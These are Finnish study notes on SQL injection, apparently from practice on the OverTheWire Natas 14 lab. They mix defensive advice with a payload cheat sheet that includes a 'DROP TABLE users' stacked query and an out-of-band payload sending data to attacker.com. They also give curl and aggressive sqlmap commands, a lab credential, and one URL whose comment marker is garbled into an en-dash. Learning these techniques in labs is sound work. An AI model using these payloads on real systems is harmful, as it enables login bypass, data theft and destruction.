# SQL injektio

Tämä koskee siis periaatteessa normaalisti SQL (MySQL) tietokannan injektiota, jossa yritettään ratkaista ja päästä johonkin kirjauttumisen lomakkeesta sisään. Nykyään ja tulevaisuudessakin paljon kirjauttumisessa pyydettään syötä **username;password**. 

Tämän kirjauttumisen tapahtuu usein siten, että se lähettää jos käyttäjnimi ja salasana täsmää niin se lähettää tarkistuksen sinne palvelmille, jossa verrataan tietokannan tallennetuihin tietoihin. Tämä mahdollistaa sen, että käyttäjät voivat kirjautua sisään omilla tunnuksillaan. Sekä tämän kirjauttumisen tapahtuu usein, kun se kirjauttumisen ohjelma on integroitu mm. *mongodb/phpmyadmin* tai muu tietokanta kaltaiseen ohjelman alle. 

Sama pätee istunto, että haluaako se tallentaa tai antaa se selaimelle evästeen (`cookie`) tunnistamista varten. 

Kuitenkin SQL injektiosta koskien haavoittuvuudesta voivat riippua monista tekijöistä, kuten palvelimen versiosta, tietokannan asetuksista, ohjelmointikielen käytöstä ja siitä, miten sovellus on rakennettu. SQL-injektio on edelleen yksi yleisimmistä tietoturvahaavoittuvuuksista web-sovelluksissa, ja sen estäminen vaatii huolellista suunnittelua ja käytäntöjä.



## SQL-Injektio Haavoittuvuudet ja Suojaus

SQL-injektion riski voi vaihdella riippuen useista tekijöistä:

- Palvelimen ja tietokannan versioista ja päivityksistä.
- Kyselyjen rakentamistavasta (dynaamiset SQL-kyselyt vs. parametrisoidut kyselyt).
- Ohjelmointikielen ja käytettyjen työkalujen suojausominaisuuksista (esim. ORM-työkalut, jotka estävät SQL-injektion).
- Konfiguraatiovirheistä ja turvattomista käytännöistä (esim. laajat käyttöoikeudet, virheilmoitukset).

SQL-injektiohaavoittuvuuden estämiseksi on tärkeää käyttää moderneja suojausmekanismeja, kuten parametrisoituja kyselyitä, ORM-työkaluja, tietokannan käyttöoikeuksien rajoittamista ja virheilmoitusten rajoittamista.

SQL-tietokannat, kuten MySQL, eivät itsessään tue Multi-Factor Authentication (MFA) -prosessia, vaan ne keskittyvät käyttäjätietojen tallentamiseen. MFA ja autentikointi hoidetaan yleensä erillisellä palvelulla, kuten Single Sign-On (SSO) -järjestelmällä, joka voi olla esimerkiksi Microsoft Entra ID, Azure AD tai Okta. Kun käyttäjä yrittää kirjautua sisään, SSO-järjestelmä voi pakottaa MFA-tarkistuksen ennen kuin käyttäjä pääsee sovellukseen. Tietokanta (kuten MySQL) toimii vain tiedon tallennuspaikkana, ja autentikointi ja MFA-tarkistukset suoritetaan SSO-palveluissa ennen pääsyä sovellukseen ja sen tietokantaan.

---

# SQL Injektio - Whitehat
**white hat -testaajat** (eli eettiset hakkeroijat, penetraatiotestaajat jne.) käyttävät hyvin usein juuri tuollaista SQL-injektiorakennetta testatessaan, onko verkkosovellus altis SQL-injektiolle.

**Klassinen SQL-injektio:** <br><br>
Jos lomake tai URL-parametrit välitetään suoraan SQL-kyselyyn ilman suojausta, kuten:<br>
`SELECT * FROM users WHERE username = '[syöte]' AND password = '[syöte]';`

password (syöte) siis joku satunnainen sana väliin <br>

<br>
Tällöin kyselystä tulee käytännössä: <br>

`SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';`

<br>
Mitä tämä tekee?<br>

```
' OR 1=1 --:
' päättää alkuperäisen stringin.
OR 1=1 on aina tosi, joten se ohittaa autentikoinnin.
-- on SQL-kommenttimerkki, joka kommentoi loput rivistä pois (eli AND password = ... jää huomiotta).
```

## SQL injektio muita menetelmiä 

nykyaikainen white hat -testaus ja hyökkäystavat voivat käyttää monia eri tekniikoita riippuen sovelluksen rakenteesta, suojauksista ja tietokannasta.


1. UNION SQL Injection <br>
' UNION SELECT username, password FROM users --


2. Tautology Injection (klassikko: OR 1=1) <br>
' OR 1=1 --


3. Blind SQL Injection (Boolean-based) <br>
' AND 1=1 --   # toimii
' AND 1=2 --   # ei toimi


4. Time-based Blind SQL Injection <br>
' OR IF(1=1, SLEEP(5), 0) -- 


5. Error-based SQL Injection <br>
' ORDER BY 100 -- 


6. Stacked Queries (jos sallittu) <br>
'; DROP TABLE users; --


7. Second-order SQL Injection <br>
Tätä ei suoriteta heti, vaan tallennetaan ensin ja suoritetaan myöhemmin toisessa yhteydessä. Eli ensin rekisteröidään käyttäjänimi ja sitten 


8. Out-of-Band SQL Injection <br>
Tämä vaatii erityisiä olosuhteita, ja SQL-injektio lähettää tiedon ulos järjestelmästä, esim. DNS-kyselynä: <br>
' OR LOAD_FILE('\\\\attacker.com\\file') -- 



9. Using SQL Comments Smartly <br>
-- (yksirivinen kommentti) <br>
/* comment */ (monirivinen) <br>
%23 (URL-koodattu #, MySQL-kommentti) <br>
esim: `' OR 1=1 /*'`


✅ Miten white hat testaa eri metodit? <br>
- Kokeilee klassista: `' OR 1=1 --`
- Testaa error-muotoja ja katsoo mitä virheilmoituksia tulee <br>
- Testaa blind-injektiot jos mitään ei palaudu <br>
- Vahvistaa että kyseessä on injektio testaamalla SLEEP, ORDER BY, jne. <br>
- Käyttää automatisoituja työkaluja kuten sqlmap <br>

---
 
# SQL injektio mini huomio - START HERE 

pieni huomiona tämä osuus - tämä taulukko toimii kuin pien lunttilappuna, usein kirjauttumisessa voi olla monen tyyppistä et pelkä käyttäjäjänimeä. Tätä taulukkon mukaista prosessia kutsutaan **SQL - injektion manipulointia, ei salasanojen arvaamista**  kuitenkin yritetään **muokata taustalla olevaa SQL-kyselyä esim. just syöttämällä noita erikoismerkkiä `"` tai `'` tai yhdistelmiä just `"' OR 1=1 --`. Tästä just ideana **testata onko oleva tietokanta haavoittuvainen syötteiden käsittylssä**. 

Kun palvelin EI käsittele syötettä turvallisesti, hyökkääjä voi ohittaa autentikoinnin tai käskeä tietokantaa tekemään jotain muuta (kuten palauttamaan kaikki käyttäjät).



| Kenttä     | Syöte / URL                      | Arvo (selkokielisenä)                 | Ero ja merkitys                                                                 |
|------------|----------------------------------|----------------------------------------|----------------------------------------------------------------------------------|
| username   | Lomakesyöte                      | `admin"' OR 1=1 --`                    | Täysin identtinen injektio URL- ja lomakeversioissa.                            |
| password   | Lomakesyöte                      | `password' OR 1=1 --"`                 | Alkuosa (`password`) eroaa, mutta injektio toimii jos SQL ei hajoa.             |
| username   | URL (enkoodattu)                 | `admin"' OR 1=1 --`                    | Sama injektio kuin lomakkeessa, mutta URL-muodossa enkoodattuna.                |
| password   | URL (enkoodattu)                 | `admin' OR 1=1 --"`                    | Eroaa lomakeversiosta alkuosan (`admin`) takia – voi vaikuttaa SQL-syntaksiin.  |
| **KOKO URL** | `/index.php?...`                 | `username=admin"' OR 1=1 --`<br>`password=admin' OR 1=1 --"` | Käytännössä toimii kuten lomakesyöte, mutta erona on alkuarvon ero `password`-kentässä. |
| username   | `username=admin%22%20OR%201%3D1%20--` | `admin" OR 1=1 --`                    | URL-enkoodattu versio: `%22` vastaa `"` ja `%20` vastaa välilyöntiä |


SQL injektiossa idea on just nämä erikoismerkit kuten `"` , `'` , `"'`, `+` ja `--`. Huomoina toi keskimmäinen just pätee yhdistettynä, ja niiden yhdistelmeitä testeissä ja se pätee sekä lomakkeessa että URL:issa. 

- Tässä tapauksessa **"** (`%22`) sulkee `username`-kentän alkuperäisen arvon ja sen jälkeen **injektio toimii**: `OR 1=1 --` on SQL-lauseke, joka on tosi ja estää salasanan tarkistuksen.


## Harjoitusta kohti mestariksi

Alkuum meneekin `' OR 1=1 --` - koska se on perusideana mikä lähtee harjoittelusta. Sitä näkee nopeasti, reagoi järjestelmän jollakin tavalla, että onnistuuko kirjautuminen vai tuleeko virhettä, jäätyykö pyyntö ja tms. Tämä periaatteessa toimii kuin ensimmäinen _pingi_ eli testaa onko järjestelmässä injektiota. 

Periaatteessa tämä `' OR 1=1 --` - voi toimia pienenä lunttilappuna ja pikaisella koodina.

Jos taso menee vaikeammaksi niin lomake kenttään käytä suodatusta  `'` - merkkiä 

Muita vaiheita tulee mukaan:
- Blind SQLi (testataan vaikka `AND 1=1` vs. `AND 1=2` ja katsotaan käyttäytyminen)
- Time-based SQLi (esim. `SLEEP(5)`-pohjaiset injektiot)
- Automatisointi (sqlmap) kun payloadit monimutkaistuvat

--- 

## SQL injektio CURL komennossa ja URL:ssa

CURL - komento pätee SQL-injektion testaammista, mutta erityisesti POST - ja GET pyyntöjen muokkaamista. Huomioina erikoismerkistä (`"`, `'`, `=`, normiväli, `--` ja jne) näitä täytyy enkoodata URL-linkin muotoon, jotta ne eivät riko komentoa tai HTTP-protokollaa. 

Tämä pätee `curl`- komento POST-pyyntö SQL-injektiolla:

`curl "http://target.site/login?username=admin' OR 1=1 --&password=whatever"`

```
curl -X POST http://target.site/login \
  -d "username=admin' OR 1=1 --&password=whatever"
```

Tämä on alempi komennon kuvausta tarkennuksena: 
-X POST: tehdään POST-pyyntö
-d: data, joka normaalisti tulisi lomakkeesta:
--compressed: pakkaustuki, joskus tarpeen Overthewire-labroissa
```
curl -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 \
  -X POST "http://natas14.natas.labs.overthewire.org/" \
  -d "username=admin\" OR 1=1 --&password=irrelevant" \
  --compressed
```

Kun käytät SQL-injektiota URLin kautta, sinun täytyy URL-enkoodata erikoismerkit, jotta ne menevät palvelimelle oikein — muuten selain tai palvelin tulkkaa ne väärin tai estää pyynnön kokonaan.

`' OR 1=1 --`- on enkoodattuna muodossa `%27%20OR%201%3D1%20--`

🔎 Miksi enkoodata?
Web-palvelimet ja selaimet odottavat, että URL:ssa on vain tietyt sallitut merkit. Jos laitat esimerkiksi ' (heittomerkki) suoraan URLiin, se voi rikkoa pyynnön tai aiheuttaa virheen jo ennen kuin se ehtii tietokantaan asti.

esim. `curl "http://example.com/login.php?username=admin%27%20OR%201%3D1%20--&password=whatever"`

Esim. tässä Natas 14 harjoituksessa: `http://natas14.natas.labs.overthewire.org/index.php?debug=1&&username=admin&&password=admin%22%20OR%201=1%E2%80%93%20&&password=admin`

---

## SQLMAP komento

tehokkuus ja laajuus säädetään sqlmapissa `--level` ja `--risk` -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.

Asetus	Merkitys
--level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
--risk=1-3	- Kuinka "riskialttiita" hyökkäyksiä käytetään (1 = turvallisia, 3 = voivat rikkoa)

**ESIM**:
SQLMAP komento POST-pyyntö esim:
```
sqlmap -u "http://natas14.natas.labs.overthewire.org/" \
  --auth-type Basic --auth-cred "natas14:YOURPASSWORD" \
  --data="username=admin&password=admin" \
  --level=5 --risk=3 --batch
```


